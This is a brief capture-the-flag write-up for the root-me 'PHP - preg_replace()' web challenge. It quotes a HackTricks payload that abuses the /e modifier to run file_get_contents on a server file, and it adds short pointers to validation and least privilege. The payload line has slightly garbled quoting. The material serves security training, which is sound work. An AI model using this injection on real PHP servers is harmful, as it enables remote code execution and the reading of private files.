# PHP preg_replace

[root-me challenge PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace): Read `flag.php`.

----

Using [HackTricks Code execution using preg_replace()](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#code-execution-using-preg_replace):

```text
preg_replace("/a/e","file_get_contents(".passwd")","whatever")
```

## Techniques

- [Remote code execution (RCE)](../../techniques/rce.md)
- [Server-side injection runbook](../../runbooks/injection.md)

## Counter moves

PHP preg_replace is the variant in play. Server-side validation and least privilege are what these reduce to. The defender's view can be found in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
